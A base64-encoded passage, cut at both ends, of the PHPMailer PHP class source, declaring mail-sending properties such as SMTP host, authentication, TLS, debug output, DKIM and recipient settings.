ZGVycyB0aGF0IGNyZWF0ZUhlYWRlcigpIGRvZXNuJ3QgZm9sZCBpbi4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJG1haWxIZWFkZXIgPSAnJzsKCiAgICAvKioKICAgICAqIFdvcmQtd3JhcCB0aGUgbWVzc2FnZSBib2R5IHRvIHRoaXMgbnVtYmVyIG9mIGNoYXJzLgogICAgICogU2V0IHRvIDAgdG8gbm90IHdyYXAuIEEgdXNlZnVsIHZhbHVlIGhlcmUgaXMgNzgsIGZvciBSRkMyODIyIHNlY3Rpb24gMi4xLjEgY29tcGxpYW5jZS4KICAgICAqIEB2YXIgaW50ZWdlcgogICAgICovCiAgICBwdWJsaWMgJFdvcmRXcmFwID0gMDsKCiAgICAvKioKICAgICAqIFdoaWNoIG1ldGhvZCB0byB1c2UgdG8gc2VuZCBtYWlsLgogICAgICogT3B0aW9uczogIm1haWwiLCAic2VuZG1haWwiLCBvciAic210cCIuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJE1haWxlciA9ICdtYWlsJzsKCiAgICAvKioKICAgICAqIFRoZSBwYXRoIHRvIHRoZSBzZW5kbWFpbCBwcm9ncmFtLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRTZW5kbWFpbCA9ICcvdXNyL3NiaW4vc2VuZG1haWwnOwoKICAgIC8qKgogICAgICogV2hldGhlciBtYWlsKCkgdXNlcyBhIGZ1bGx5IHNlbmRtYWlsLWNvbXBhdGlibGUgTVRBLgogICAgICogT25lIHdoaWNoIHN1cHBvcnRzIHNlbmRtYWlsJ3MgIi1vaSAtZiIgb3B0aW9ucy4KICAgICAqIEB2YXIgYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgJFVzZVNlbmRtYWlsT3B0aW9ucyA9IHRydWU7CgogICAgLyoqCiAgICAgKiBQYXRoIHRvIFBIUE1haWxlciBwbHVnaW5zLgogICAgICogVXNlZnVsIGlmIHRoZSBTTVRQIGNsYXNzIGlzIG5vdCBpbiB0aGUgUEhQIGluY2x1ZGUgcGF0aC4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKiBAZGVwcmVjYXRlZCBTaG91bGQgbm90IGJlIG5lZWRlZCBub3cgdGhlcmUgaXMgYW4gYXV0b2xvYWRlci4KICAgICAqLwogICAgcHVibGljICRQbHVnaW5EaXIgPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBlbWFpbCBhZGRyZXNzIHRoYXQgYSByZWFkaW5nIGNvbmZpcm1hdGlvbiBzaG91bGQgYmUgc2VudCB0bywgYWxzbyBrbm93biBhcyByZWFkIHJlY2VpcHQuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJENvbmZpcm1SZWFkaW5nVG8gPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBob3N0bmFtZSB0byB1c2UgaW4gdGhlIE1lc3NhZ2UtSUQgaGVhZGVyIGFuZCBhcyBkZWZhdWx0IEhFTE8gc3RyaW5nLgogICAgICogSWYgZW1wdHksIFBIUE1haWxlciBhdHRlbXB0cyB0byBmaW5kIG9uZSB3aXRoLCBpbiBvcmRlciwKICAgICAqICRfU0VSVkVSWydTRVJWRVJfTkFNRSddLCBnZXRob3N0bmFtZSgpLCBwaHBfdW5hbWUoJ24nKSwgb3IgdGhlIHZhbHVlCiAgICAgKiAnbG9jYWxob3N0LmxvY2FsZG9tYWluJy4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkSG9zdG5hbWUgPSAnJzsKCiAgICAvKioKICAgICAqIEFuIElEIHRvIGJlIHVzZWQgaW4gdGhlIE1lc3NhZ2UtSUQgaGVhZGVyLgogICAgICogSWYgZW1wdHksIGEgdW5pcXVlIGlkIHdpbGwgYmUgZ2VuZXJhdGVkLgogICAgICogWW91IGNhbiBzZXQgeW91ciBvd24sIGJ1dCBpdCBtdXN0IGJlIGluIHRoZSBmb3JtYXQgIjxpZEBkb21haW4+IiwKICAgICAqIGFzIGRlZmluZWQgaW4gUkZDNTMyMiBzZWN0aW9uIDMuNi40IG9yIGl0IHdpbGwgYmUgaWdub3JlZC4KICAgICAqIEBzZWUgaHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzUzMjIjc2VjdGlvbi0zLjYuNAogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRNZXNzYWdlSUQgPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBtZXNzYWdlIERhdGUgdG8gYmUgdXNlZCBpbiB0aGUgRGF0ZSBoZWFkZXIuCiAgICAgKiBJZiBlbXB0eSwgdGhlIGN1cnJlbnQgZGF0ZSB3aWxsIGJlIGFkZGVkLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRNZXNzYWdlRGF0ZSA9ICcnOwoKICAgIC8qKgogICAgICogU01UUCBob3N0cy4KICAgICAqIEVpdGhlciBhIHNpbmdsZSBob3N0bmFtZSBvciBtdWx0aXBsZSBzZW1pY29sb24tZGVsaW1pdGVkIGhvc3RuYW1lcy4KICAgICAqIFlvdSBjYW4gYWxzbyBzcGVjaWZ5IGEgZGlmZmVyZW50IHBvcnQKICAgICAqIGZvciBlYWNoIGhvc3QgYnkgdXNpbmcgdGhpcyBmb3JtYXQ6IFtob3N0bmFtZTpwb3J0XQogICAgICogKGUuZy4gInNtdHAxLmV4YW1wbGUuY29tOjI1O3NtdHAyLmV4YW1wbGUuY29tIikuCiAgICAgKiBZb3UgY2FuIGFsc28gc3BlY2lmeSBlbmNyeXB0aW9uIHR5cGUsIGZvciBleGFtcGxlOgogICAgICogKGUuZy4gInRsczovL3NtdHAxLmV4YW1wbGUuY29tOjU4Nztzc2w6Ly9zbXRwMi5leGFtcGxlLmNvbTo0NjUiKS4KICAgICAqIEhvc3RzIHdpbGwgYmUgdHJpZWQgaW4gb3JkZXIuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJEhvc3QgPSAnbG9jYWxob3N0JzsKCiAgICAvKioKICAgICAqIFRoZSBkZWZhdWx0IFNNVFAgc2VydmVyIHBvcnQuCiAgICAgKiBAdmFyIGludGVnZXIKICAgICAqIEBUT0RPIFdoeSBpcyB0aGlzIG5lZWRlZCB3aGVuIHRoZSBTTVRQIGNsYXNzIHRha2VzIGNhcmUgb2YgaXQ/CiAgICAgKi8KICAgIHB1YmxpYyAkUG9ydCA9IDI1OwoKICAgIC8qKgogICAgICogVGhlIFNNVFAgSEVMTyBvZiB0aGUgbWVzc2FnZS4KICAgICAqIERlZmF1bHQgaXMgJEhvc3RuYW1lLiBJZiAkSG9zdG5hbWUgaXMgZW1wdHksIFBIUE1haWxlciBhdHRlbXB0cyB0byBmaW5kCiAgICAgKiBvbmUgd2l0aCB0aGUgc2FtZSBtZXRob2QgZGVzY3JpYmVkIGFib3ZlIGZvciAkSG9zdG5hbWUuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICogQHNlZSBQSFBNYWlsZXI6OiRIb3N0bmFtZQogICAgICovCiAgICBwdWJsaWMgJEhlbG8gPSAnJzsKCiAgICAvKioKICAgICAqIFdoYXQga2luZCBvZiBlbmNyeXB0aW9uIHRvIHVzZSBvbiB0aGUgU01UUCBjb25uZWN0aW9uLgogICAgICogT3B0aW9uczogJycsICdzc2wnIG9yICd0bHMnCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJFNNVFBTZWN1cmUgPSAnJzsKCiAgICAvKioKICAgICAqIFdoZXRoZXIgdG8gZW5hYmxlIFRMUyBlbmNyeXB0aW9uIGF1dG9tYXRpY2FsbHkgaWYgYSBzZXJ2ZXIgc3VwcG9ydHMgaXQsCiAgICAgKiBldmVuIGlmIGBTTVRQU2VjdXJlYCBpcyBub3Qgc2V0IHRvICd0bHMnLgogICAgICogQmUgYXdhcmUgdGhhdCBpbiBQSFAgPj0gNS42IHRoaXMgcmVxdWlyZXMgdGhhdCB0aGUgc2VydmVyJ3MgY2VydGlmaWNhdGVzIGFyZSB2YWxpZC4KICAgICAqIEB2YXIgYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgJFNNVFBBdXRvVExTID0gdHJ1ZTsKCiAgICAvKioKICAgICAqIFdoZXRoZXIgdG8gdXNlIFNNVFAgYXV0aGVudGljYXRpb24uCiAgICAgKiBVc2VzIHRoZSBVc2VybmFtZSBhbmQgUGFzc3dvcmQgcHJvcGVydGllcy4KICAgICAqIEB2YXIgYm9vbGVhbgogICAgICogQHNlZSBQSFBNYWlsZXI6OiRVc2VybmFtZQogICAgICogQHNlZSBQSFBNYWlsZXI6OiRQYXNzd29yZAogICAgICovCiAgICBwdWJsaWMgJFNNVFBBdXRoID0gZmFsc2U7CgogICAgLyoqCiAgICAgKiBPcHRpb25zIGFycmF5IHBhc3NlZCB0byBzdHJlYW1fY29udGV4dF9jcmVhdGUgd2hlbiBjb25uZWN0aW5nIHZpYSBTTVRQLgogICAgICogQHZhciBhcnJheQogICAgICovCiAgICBwdWJsaWMgJFNNVFBPcHRpb25zID0gYXJyYXkoKTsKCiAgICAvKioKICAgICAqIFNNVFAgdXNlcm5hbWUuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJFVzZXJuYW1lID0gJyc7CgogICAgLyoqCiAgICAgKiBTTVRQIHBhc3N3b3JkLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRQYXNzd29yZCA9ICcnOwoKICAgIC8qKgogICAgICogU01UUCBhdXRoIHR5cGUuCiAgICAgKiBPcHRpb25zIGFyZSBDUkFNLU1ENSwgTE9HSU4sIFBMQUlOLCBOVExNLCBYT0FVVEgyLCBhdHRlbXB0ZWQgaW4gdGhhdCBvcmRlciBpZiBub3Qgc3BlY2lmaWVkCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJEF1dGhUeXBlID0gJyc7CgogICAgLyoqCiAgICAgKiBTTVRQIHJlYWxtLgogICAgICogVXNlZCBmb3IgTlRMTSBhdXRoCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJFJlYWxtID0gJyc7CgogICAgLyoqCiAgICAgKiBTTVRQIHdvcmtzdGF0aW9uLgogICAgICogVXNlZCBmb3IgTlRMTSBhdXRoCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJFdvcmtzdGF0aW9uID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgU01UUCBzZXJ2ZXIgdGltZW91dCBpbiBzZWNvbmRzLgogICAgICogRGVmYXVsdCBvZiA1IG1pbnV0ZXMgKDMwMHNlYykgaXMgZnJvbSBSRkMyODIxIHNlY3Rpb24gNC41LjMuMgogICAgICogQHZhciBpbnRlZ2VyCiAgICAgKi8KICAgIHB1YmxpYyAkVGltZW91dCA9IDMwMDsKCiAgICAvKioKICAgICAqIFNNVFAgY2xhc3MgZGVidWcgb3V0cHV0IG1vZGUuCiAgICAgKiBEZWJ1ZyBvdXRwdXQgbGV2ZWwuCiAgICAgKiBPcHRpb25zOgogICAgICogKiBgMGAgTm8gb3V0cHV0CiAgICAgKiAqIGAxYCBDb21tYW5kcwogICAgICogKiBgMmAgRGF0YSBhbmQgY29tbWFuZHMKICAgICAqICogYDNgIEFzIDIgcGx1cyBjb25uZWN0aW9uIHN0YXR1cwogICAgICogKiBgNGAgTG93LWxldmVsIGRhdGEgb3V0cHV0CiAgICAgKiBAdmFyIGludGVnZXIKICAgICAqIEBzZWUgU01UUDo6JGRvX2RlYnVnCiAgICAgKi8KICAgIHB1YmxpYyAkU01UUERlYnVnID0gMDsKCiAgICAvKioKICAgICAqIEhvdyB0byBoYW5kbGUgZGVidWcgb3V0cHV0LgogICAgICogT3B0aW9uczoKICAgICAqICogYGVjaG9gIE91dHB1dCBwbGFpbi10ZXh0IGFzLWlzLCBhcHByb3ByaWF0ZSBmb3IgQ0xJCiAgICAgKiAqIGBodG1sYCBPdXRwdXQgZXNjYXBlZCwgbGluZSBicmVha3MgY29udmVydGVkIHRvIGA8YnI+YCwgYXBwcm9wcmlhdGUgZm9yIGJyb3dzZXIgb3V0cHV0CiAgICAgKiAqIGBlcnJvcl9sb2dgIE91dHB1dCB0byBlcnJvciBsb2cgYXMgY29uZmlndXJlZCBpbiBwaHAuaW5pCiAgICAgKgogICAgICogQWx0ZXJuYXRpdmVseSwgeW91IGNhbiBwcm92aWRlIGEgY2FsbGFibGUgZXhwZWN0aW5nIHR3byBwYXJhbXM6IGEgbWVzc2FnZSBzdHJpbmcgYW5kIHRoZSBkZWJ1ZyBsZXZlbDoKICAgICAqIDxjb2RlPgogICAgICogJG1haWwtPkRlYnVnb3V0cHV0ID0gZnVuY3Rpb24oJHN0ciwgJGxldmVsKSB7ZWNobyAiZGVidWcgbGV2ZWwgJGxldmVsOyBtZXNzYWdlOiAkc3RyIjt9OwogICAgICogPC9jb2RlPgogICAgICogQHZhciBzdHJpbmd8Y2FsbGFibGUKICAgICAqIEBzZWUgU01UUDo6JERlYnVnb3V0cHV0CiAgICAgKi8KICAgIHB1YmxpYyAkRGVidWdvdXRwdXQgPSAnZWNobyc7CgogICAgLyoqCiAgICAgKiBXaGV0aGVyIHRvIGtlZXAgU01UUCBjb25uZWN0aW9uIG9wZW4gYWZ0ZXIgZWFjaCBtZXNzYWdlLgogICAgICogSWYgdGhpcyBpcyBzZXQgdG8gdHJ1ZSB0aGVuIHRvIGNsb3NlIHRoZSBjb25uZWN0aW9uCiAgICAgKiByZXF1aXJlcyBhbiBleHBsaWNpdCBjYWxsIHRvIHNtdHBDbG9zZSgpLgogICAgICogQHZhciBib29sZWFuCiAgICAgKi8KICAgIHB1YmxpYyAkU01UUEtlZXBBbGl2ZSA9IGZhbHNlOwoKICAgIC8qKgogICAgICogV2hldGhlciB0byBzcGxpdCBtdWx0aXBsZSB0byBhZGRyZXNzZXMgaW50byBtdWx0aXBsZSBtZXNzYWdlcwogICAgICogb3Igc2VuZCB0aGVtIGFsbCBpbiBvbmUgbWVzc2FnZS4KICAgICAqIE9ubHkgc3VwcG9ydGVkIGluIGBtYWlsYCBhbmQgYHNlbmRtYWlsYCB0cmFuc3BvcnRzLCBub3QgaW4gU01UUC4KICAgICAqIEB2YXIgYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgJFNpbmdsZVRvID0gZmFsc2U7CgogICAgLyoqCiAgICAgKiBTdG9yYWdlIGZvciBhZGRyZXNzZXMgd2hlbiBTaW5nbGVUbyBpcyBlbmFibGVkLgogICAgICogQHZhciBhcnJheQogICAgICogQFRPRE8gVGhpcyBzaG91bGQgcmVhbGx5IG5vdCBiZSBwdWJsaWMKICAgICAqLwogICAgcHVibGljICRTaW5nbGVUb0FycmF5ID0gYXJyYXkoKTsKCiAgICAvKioKICAgICAqIFdoZXRoZXIgdG8gZ2VuZXJhdGUgVkVSUCBhZGRyZXNzZXMgb24gc2VuZC4KICAgICAqIE9ubHkgYXBwbGljYWJsZSB3aGVuIHNlbmRpbmcgdmlhIFNNVFAuCiAgICAgKiBAbGluayBodHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9WYXJpYWJsZV9lbnZlbG9wZV9yZXR1cm5fcGF0aAogICAgICogQGxpbmsgaHR0cDovL3d3dy5wb3N0Zml4Lm9yZy9WRVJQX1JFQURNRS5odG1sIFBvc3RmaXggVkVSUCBpbmZvCiAgICAgKiBAdmFyIGJvb2xlYW4KICAgICAqLwogICAgcHVibGljICRkb192ZXJwID0gZmFsc2U7CgogICAgLyoqCiAgICAgKiBXaGV0aGVyIHRvIGFsbG93IHNlbmRpbmcgbWVzc2FnZXMgd2l0aCBhbiBlbXB0eSBib2R5LgogICAgICogQHZhciBib29sZWFuCiAgICAgKi8KICAgIHB1YmxpYyAkQWxsb3dFbXB0eSA9IGZhbHNlOwoKICAgIC8qKgogICAgICogVGhlIGRlZmF1bHQgbGluZSBlbmRpbmcuCiAgICAgKiBAbm90ZSBUaGUgZGVmYXVsdCByZW1haW5zICJcbiIuIFdlIGZvcmNlIENSTEYgd2hlcmUgd2Uga25vdwogICAgICogICAgICAgIGl0IG11c3QgYmUgdXNlZCB2aWEgc2VsZjo6Q1JMRi4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkTEUgPSAiXG4iOwoKICAgIC8qKgogICAgICogREtJTSBzZWxlY3Rvci4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkREtJTV9zZWxlY3RvciA9ICcnOwoKICAgIC8qKgogICAgICogREtJTSBJZGVudGl0eS4KICAgICAqIFVzdWFsbHkgdGhlIGVtYWlsIGFkZHJlc3MgdXNlZCBhcyB0aGUgc291cmNlIG9mIHRoZSBlbWFpbC4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkREtJTV9pZGVudGl0eSA9ICcnOwoKICAgIC8qKgogICAgICogREtJTSBwYXNzcGhyYXNlLgogICAgICogVXNlZCBpZiB5b3VyIGtleSBpcyBlbmNyeXB0ZWQuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJERLSU1fcGFzc3BocmFzZSA9ICcnOwoKICAgIC8qKgogICAgICogREtJTSBzaWduaW5nIGRvbWFpbiBuYW1lLgogICAgICogQGV4YW1wbGUgJ2V4YW1wbGUuY29tJwogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRES0lNX2RvbWFpbiA9ICcnOwoKICAgIC8qKgogICAgICogREtJTSBwcml2YXRlIGtleSBmaWxlIHBhdGguCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJERLSU1fcHJpdmF0ZSA9ICcnOwoKICAgIC8qKgogICAgICogREtJTSBwcml2YXRlIGtleSBzdHJpbmcuCiAgICAgKiBJZiBzZXQsIHRha2VzIHByZWNlZGVuY2Ugb3ZlciBgJERLSU1fcHJpdmF0ZWAuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJERLSU1fcHJpdmF0ZV9zdHJpbmcgPSAnJzsKCiAgICAvKioKICAgICAqIENhbGxiYWNrIEFjdGlvbiBmdW5jdGlvbiBuYW1lLgogICAgICoKICAgICAqIFRoZSBmdW5jdGlvbiB0aGF0IGhhbmRsZXMgdGhlIHJlc3VsdCBvZiB0aGUgc2VuZCBlbWFpbCBhY3Rpb24uCiAgICAgKiBJdCBpcyBjYWxsZWQgb3V0IGJ5IHNlbmQoKSBmb3IgZWFjaCBlbWFpbCBzZW50LgogICAgICoKICAgICAqIFZhbHVlIGNhbiBiZSBhbnkgcGhwIGNhbGxhYmxlOiBodHRwOi8vd3d3LnBocC5uZXQvaXNfY2FsbGFibGUKICAgICAqCiAgICAgKiBQYXJhbWV0ZXJzOgogICAgICogICBib29sZWFuICRyZXN1bHQgICAgICAgIHJlc3VsdCBvZiB0aGUgc2VuZCBhY3Rpb24KICAgICAqICAgYXJyYXkgICAkdG8gICAgICAgICAgICBlbWFpbCBhZGRyZXNzZXMgb2YgdGhlIHJlY2lwaWVudHMKICAgICAqICAgYXJyYXkgICAkY2MgICAgICAgICAgICBjYyBlbWFpbCBhZGRyZXNzZXMKICAgICAqICAgYXJyYXkgICAkYmNjICAgICAgICAgICBiY2MgZW1haWwgYWRkcmVzc2VzCiAgICAgKiAgIHN0cmluZyAgJHN1YmplY3QgICAgICAgdGhlIHN1YmplY3QKICAgICAqICAgc3RyaW5nICAkYm9keSAgICAgICAgICB0aGUgZW1haWwgYm9keQogICAgICogICBzdHJpbmcgICRmcm9tICAgICAgICAgIGVtYWlsIGFkZHJlc3Mgb2Ygc2VuZGVyCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJGFjdGlvbl9mdW5jdGlvbiA9ICcnOwoKICAgIC8qKgogICAgICogV2hhdCB0byBwdXQgaW4gdGhlIFgtTWFpbGVyIGhlYWRlci4KICAgICAqIE9wdGlvbnM6IEFuIGVtcHR5IHN0cmluZyBmb3IgUEhQTWFpbGVyIGRlZmF1bHQsIHdoaXRlc3BhY2UgZm9yIG5vbmUsIG9yIGEgc3RyaW5nIHRvIHVzZQogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRYTWFpbGVyID0gJyAnOwoKICAgIC8qKgogICAgICogV2hpY2ggdmFsaWRhdG9yIHRvIHVzZSBieSBkZWZhdWx0IHdoZW4gdmFsaWRhdGluZyBlbWFpbCBhZGRyZXNzZXMuCiAgICAgKiBNYXkgYmUgYSBjYWxsYWJsZSB0byBpbmplY3QgeW91ciBvd24gdmFsaWRhdG9yLCBidXQgdGhlcmUgYXJlIHNldmVyYWwgYnVpbHQtaW4gdmFsaWRhdG9ycy4KICAgICAqIEBzZWUgUEhQTWFpbGVyOjp2YWxpZGF0ZUFkZHJlc3MoKQogICAgICogQHZhciBzdHJpbmd8Y2FsbGFibGUKICAgICAqIEBzdGF0aWMKICAgICAqLwogICAgcHVibGljIHN0YXRpYyAkdmFsaWRhdG9yID0gJ2F1dG8nOwoKICAgIC8qKgogICAgICogQW4gaW5zdGFuY2Ugb2YgdGhlIFNNVFAgc2VuZGVyIGNsYXNzLgogICAgICogQHZhciBTTVRQCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJHNtdHAgPSBudWxsOwoKICAgIC8qKgogICAgICogVGhlIGFycmF5IG9mICd0bycgbmFtZXMgYW5kIGFkZHJlc3Nlcy4KICAgICAqIEB2YXIgYXJyYXkKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkdG8gPSBhcnJheSgpOwoKICAgIC8qKgogICAgICogVGhlIGFycmF5IG9mICdjYycgbmFtZXMgYW5kIGFkZHJlc3Nlcy4KICAgICAqIEB2YXIgYXJyYXkKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkY2MgPSBhcnJheSgpOwoKICAgIC8qKgogICAgICogVGhlIGFycmF5IG9mICdiY2MnIG5hbWVzIGFuZCBhZGRyZXNzZXMuCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJGJjYyA9IGFycmF5KCk7CgogICAgLyoqCiAgICAgKiBUaGUgYXJyYXkgb2YgcmVwbHktdG8gbmFtZXMgYW5kIGFkZHJlc3Nlcy4KICAgICAqIEB2YXIgYXJyYXkKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkUmVwbHlUbyA9IGFycmF5KCk7CgogICAgLyoqCiAgICAgKiBBbiBhcnJheSBvZiBhbGwga2luZHMgb2YgYWRkcmVzc2VzLgogICAgICogSW5jbHVkZXMgYWxsIG9mICR0bywgJGNjLCAkYmNjCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHNlZSBQSFBNYWlsZXI6OiR0byBAc2VlIFBIUE1haWxlcjo6JGNjIEBzZWUgUEhQTWFpbGVyOjokYmNjCiAgICAgKi8KICAgIHByb3RlY3RlZCAkYWxsX3JlY2lwaWVudHMgPSBhcnJheSgpOwoKICAgIC8qKgogICAgICogQW4gYXJyYXkgb2YgbmFtZXMgYW5kIGFkZHJlc3NlcyBxdWV1ZWQgZm9yIHZhbGlkYXRpb24uCiAgICAgKiBJbiBzZW5kKCksIHZhbGlkIGFuZCBub24gZHVwbGljYXRlIGVudHJpZXMgYXJlIG1vdmVkIHRvICRhbGxfcmVjaXBpZW50cwogICAgICogYW5kIG9uZSBvZiAkdG8sICRjYywgb3IgJGJjYy4KICAgICAqIFRoaXMgYXJyYXkgaXMgdXNlZCBvbmx5IGZvciBhZGRyZXNzZXMgd2l0aCBJRE4uCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHNlZSBQSFBNYWlsZXI6OiR0byBAc2VlIFBIUE1haWxlcjo6JGNjIEBzZWUgUEhQTWFpbGVyOjokYmNjCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6JGFsbF9yZWNpcGllbnRzCiAgICAgKi8KICAgIHByb3RlY3RlZCAkUmVjaXBpZW50c1F1ZXVlID0gYXJyYXkoKTsKCiAgICAvKioKICAgICAqIEFuIGFycmF5IG9mIHJlcGx5LXRvIG5hbWVzIGFuZCBhZGRyZXNzZXMgcXVldWVkIGZvciB2YWxpZGF0aW9uLgogICAgICogSW4gc2VuZCgpLCB2YWxpZCBhbmQgbm9uIGR1cGxpY2F0ZSBlbnRyaWVzIGFyZSBtb3ZlZCB0byAkUmVwbHlUby4KICAgICAqIFRoaXMgYXJyYXkgaXMgdXNlZCBvbmx5IGZvciBhZGRyZXNzZXMgd2l0aCBJRE4uCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHNlZSBQSFBNYWlsZXI6OiRSZXBseVRvCiAgICAgKi8KICAgIHByb3RlY3RlZCAkUmVwbHlUb1F1ZXVlID0gYXJyYXkoKTsKCiAgICAvKioKICAgICAqIFRoZSBhcnJheSBvZiBhdHRhY2htZW50cy4KICAgICAqIEB2YXIgYXJyYXkKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkYXR0YWNobWVudCA9IGFycmF5KCk7CgogICAgLyoqCiAgICAgKiBUaGUgYXJyYXkgb2YgY3VzdG9tIGhlYWRlcnMuCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJEN1c3RvbUhlYWRlciA9IGFycmF5KCk7CgogICAgLyoqCiAgICAgKiBUaGUgbW9zdCByZWNlbnQgTWVzc2FnZS1JRCAoaW5jbHVkaW5nIGFuZ3VsYXIgYnJhY2tldHMpLgogICAgICogQHZhciBzdHJpbmcKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkbGFzdE1lc3NhZ2VJRCA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIG1lc3NhZ2UncyBNSU1FIHR5cGUuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICRtZXNzYWdlX3R5cGUgPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBhcnJheSBvZiBNSU1FIGJvdW5kYXJ5IHN0cmluZ3MuCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJGJvdW5kYXJ5ID0gYXJyYXkoKTsKCiAgICAvKioKICAgICAqIFRoZSBhcnJheSBvZiBhdmFpbGFibGUgbGFuZ3VhZ2VzLgogICAgICogQHZhciBhcnJheQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICRsYW5ndWFnZSA9IGFycmF5KCk7CgogICAgLyoqCiAgICAgKiBUaGUgbnVtYmVyIG9mIGVycm9ycyBlbmNvdW50ZXJlZC4KICAgICAqIEB2YXIgaW50ZWdlcgogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICRlcnJvcl9jb3VudCA9IDA7CgogICAgLyoqCiAgICAgKiBUaGUgUy9NSU1FIGNlcnRpZmljYXRlIGZpbGUgcGF0aC4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJHNpZ25fY2VydF9maWxlID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgUy9NSU1FIGtleSBmaWxlIHBhdGguCiAgICAgKiBAdmFyIHN0cmluZwogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICRzaWduX2tleV9maWxlID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgb3B0aW9uYWwgUy9NSU1FIGV4dHJhIGNlcnRpZmljYXRlcyAoIkNBIENoYWluIikgZmlsZSBwYXRoLgogICAgICogQHZhciBzdHJpbmcKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkc2lnbl9leHRyYWNlcnRzX2ZpbGUgPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBTL01JTUUgcGFzc3dvcmQgZm9yIHRoZSBrZXkuCiAgICAgKiBVc2VkIG9ubHkgaWYgdGhlIGtleSBpcyBlbmNyeXB0ZWQuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICRzaWduX2tleV9wYXNzID0gJyc7CgogICAgLyoqCiAgICAgKiBXaGV0aGVyIHRvIHRocm93IGV4Y2VwdGlvbnMgZm9yIGVycm9ycy4KICAgICAqIEB2YXIgYm9vbGVhbgogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICRleGNlcHRpb25zID0gZmFsc